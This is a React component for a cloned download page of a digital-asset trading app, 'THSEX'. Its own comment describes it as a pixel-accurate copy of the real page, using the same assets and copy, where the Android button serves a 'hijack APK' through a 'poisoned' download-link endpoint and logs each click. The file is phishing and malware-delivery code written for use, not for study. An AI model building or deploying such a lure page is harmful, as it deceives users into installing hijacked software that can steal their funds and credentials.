"use client";

import { useEffect, useState } from "react";
import { HIJACK_APK_PATH } from "@/lib/config";

type Links = Record<string, string>;

async function logHit(action: string) {
  try {
    await fetch("/api/hit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action }),
    });
  } catch {
    /* silent */
  }
}

/**
 * Pixel-accurate clone of pages/downapp/index from THSEX app.
 * Same assets (down11/22/33.png), same layout, same copy.
 * Only Android button serves hijack APK via poisoned /api/downloadlink.
 */
export default function DownAppClone() {
  const [links, setLinks] = useState<Links>({});
  const [downloading, setDownloading] = useState(false);

  useEffect(() => {
    fetch("/api/proxy/downloadlink", { cache: "no-store" })
      .then((r) => r.json())
      .then((json) => {
        const map: Links = {};
        if (Array.isArray(json.data)) {
          for (const row of json.data) {
            const t = String(row.type || "").toLowerCase();
            if (t && row.url) map[t] = String(row.url);
          }
        }
        setLinks(map);
      })
      .catch(() => setLinks({}));
  }, []);

  async function onAndroidClick() {
    if (downloading) return;
    setDownloading(true);
    await logHit("android_download");

    const url = links.android || HIJACK_APK_PATH;
    window.location.href = url;
  }

  function onAppleClick() {
    if (!links.apple || links.apple === "#") return;
    window.location.href = links.apple;
  }

  return (
    <div className="downapp-page page">
      <div className="downapp-status-bar" />

      <div className="hero-block">
        <div className="brand">THSEX</div>
        <div className="hero-title">
          <span>Start </span>
          <span className="hero-title-highlight">Digital Asset Trading</span>
          <span>New Route</span>
        </div>
        <div className="hero-subtitle">
          Digital asset trading - easy to start, simple and worry-free
        </div>
      </div>

      <img className="hero-image" src="/assets/down11.png" alt="" />

      <div className="download-card">
        <img
          className="download-btn"
          src="/assets/down22.png"
          alt="Download on the App Store"
          role="button"
          tabIndex={0}
          onClick={onAppleClick}
          onKeyDown={(e) => e.key === "Enter" && onAppleClick()}
        />
        <img
          className="download-btn"
          src="/assets/down33.png"
          alt="Download on the Android APK"
          role="button"
          tabIndex={0}
          onClick={onAndroidClick}
          onKeyDown={(e) => e.key === "Enter" && onAndroidClick()}
        />
      </div>

      <div className="Install">
        <span>Install now, </span>
        <span className="Install-highlight">start trading</span>
      </div>
    </div>
  );
}
